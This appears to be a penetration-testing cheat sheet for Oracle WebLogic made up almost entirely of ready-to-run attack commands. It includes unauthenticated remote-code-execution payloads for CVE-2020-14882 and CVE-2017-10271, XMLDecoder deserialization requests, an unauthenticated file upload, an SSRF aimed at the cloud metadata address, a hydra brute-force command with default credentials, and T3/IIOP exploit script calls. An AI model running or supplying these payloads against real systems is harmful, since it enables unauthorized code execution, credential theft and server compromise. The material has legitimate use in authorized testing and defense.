# WebLogic Vulnerabilities

## 1. CVE-2020-14882 — Auth Bypass RCE
```bash
# Unauthenticated RCE
curl -sk "http://target/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession('java.lang.Runtime.getRuntime().exec(\"id\");')"
```

## 2. CVE-2019-2725 — XMLDecoder Deserialization
```bash
# RCE via _async
curl -sk -X POST "http://target/_async/AsyncResponseService" -d '<?xml version="1.0"?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"...>'
```

## 3. CVE-2018-2894 — File Upload
```bash
# Unauthenticated file upload
curl -sk -X POST "http://target/wls-wsat/CoordinatorPortType" -d @payload.xml
```

## 4. CVE-2017-10271 — XMLDecoder RCE
```bash
# RCE via wls-wsat
curl -sk -X POST "http://target/wls-wsat/CoordinatorPortType" -H "Content-Type: text/xml" -d '<?xml version="1.0"?><soapenv:Envelope...><java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/bash</string></void><void index="1"><string>-c</string></void><void index="2"><string>id</string></void></array><void method="start"/></object></java>...'
```

## 5. CVE-2019-2729 — Deserialization
```bash
# Similar to CVE-2019-2725
curl -sk -X POST "http://target/_async/AsyncResponseService" -d @payload.xml
```

## 6. SSRF via UDDI Explorer
```
http://target/uddiexplorer/SearchPublicRegistries.jsp?operator=http://169.254.169.254
```

## 7. Console Login Brute Force
```bash
hydra -l weblogic -P /usr/share/wordlists/rockyou.txt target http-post-form "/console/j_security_check:j_username=^USER^&j_password=^PASS^&j_character_encoding=UTF-8:Login failed"
# Default creds: weblogic:weblogic, system:password
```

## 8. T3 Protocol Deserialization
```bash
# T3 protocol attack
python3 exploit_t3.py -t target -p 7001
```

## 9. IIOP Protocol
```bash
# IIOP deserialization
python3 exploit_iiop.py -t target -p 7001
```

## Detection
```bash
curl -sk "http://target/console/login/LoginForm.jsp"
curl -sk "http://target/wls-wsat/CoordinatorPortType"
curl -sk "http://target/_async/AsyncResponseService"
curl -sk "http://target/uddiexplorer/"
```
